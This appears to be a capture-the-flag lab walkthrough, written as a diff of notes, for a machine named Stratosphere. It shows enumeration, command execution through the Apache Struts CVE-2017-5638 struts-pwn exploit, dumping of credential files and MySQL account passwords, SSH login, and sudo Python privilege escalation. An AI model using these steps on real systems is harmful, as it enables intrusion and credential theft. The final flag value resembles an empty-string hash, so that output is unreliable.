@@ -1,0 +1,97 @@
+Stratosphere  10.10.10.64
+ttl 63 > Linux
+
+[+]Enumeration[+]
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+[+]Wfuzz
+/manager/FUZZ
+html
+text
+status
+/FUZZ
+anv..ndare
+manager
+secci.
+
+[+]GObuster
+
+/index.html           (Status: 200) [Size: 1708]
+/main.js              (Status: 200) [Size: 2035]
+/manager              (Status: 401) [Size: 2473]
+/GettingStarted.html  (Status: 200) [Size: 203] 
+/Monitoring           (Status: 200) [Size: 199]
+
+
+[+]http://10.10.10.64:8080/Monitoring/example/Welcome.action
+An exploit for Apache Struts CVE-2017-5638 - GitHub
+https://github.com/mazen160/struts-pwn
+
+[+]Apache Struts CVE-2017-5638[+]
+❯ python3 struts-pwn.py -u http://10.10.10.64:8080/Monitoring/example/Menu.action -c id
+uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
+
+❯ python3 struts-pwn.py -u http://10.10.10.64:8080/Monitoring/example/Menu.action -c "cat db_connect"
+[ssn]
+user=ssn_admin
+pass=AWs64@on*&
+
+[users]
+user=admin
+pass=admin
+
+[+]TOMCAT Credentials[+]
+❯ python3 struts-pwn.py -u http://10.10.10.64:8080/Monitoring/example/Menu.action -c "ls conf/"
+Catalina
+catalina.properties
+context.xml
+jaspic-providers.xml
+logging.properties
+policy.d
+server.xml
+tomcat-users.xml
+web.xml
+
+❯ python3 struts-pwn.py -u http://10.10.10.64:8080/Monitoring/example/Menu.action -c "cat conf/tomcat-users.xml"
+<!--
+  <role rolename="tomcat"/>
+  <role rolename="role1"/>
+  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
+  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
+  <user username="role1" password="<must-be-changed>" roles="role1"/>
+-->
+<user username="teampwner" password="cd@6sY{f^+kZV8J!+o*t|<fpNy]F_(Y$" roles="manager-gui,admin-gui" />
+</tomcat-users>
+
+
+❯ python3 struts-pwn.py -u http://10.10.10.64:8080/Monitoring/example/Menu.action -c ' mysql -u admin -padmin -e "show databases;"'
+Database
+information_schema
+users
+
+❯ python3 struts-pwn.py -u http://10.10.10.64:8080/Monitoring/example/Menu.action -c ' mysql -u admin -padmin -e "use users; show tables;" '
+Tables_in_users
+accounts
+
+❯ python3 struts-pwn.py -u http://10.10.10.64:8080/Monitoring/example/Menu.action -c ' mysql -u admin -padmin -e "use users; select * from accounts;" '
+fullName	        password	                username
+Richard F. Smith	9tc*rhKuG5TyXvUJOrE^5CK7k	richard
+
+
+[+]SSH Credentials
+ssh richard@10.10.10.64 
+password : 9tc*rhKuG5TyXvUJOrE^5CK7k
+
+[+]Privilage Escalation[+]
+richard@stratosphere:~$ cat user.txt 
+7e9cec27821bf298970e9e30d843ac21
+
+
+richard@stratosphere:~$ sudo -l
+(ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
+
+richard@stratosphere:~$ echo '__import__("os").system("cat /root/root.txt")' | sudo python2 ~/test.py
+d41d8cd98f00b204e9800998ecf8427e
